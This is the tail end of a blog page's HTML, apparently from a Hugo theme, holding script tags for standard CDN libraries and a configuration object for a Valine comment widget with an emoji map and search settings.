+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
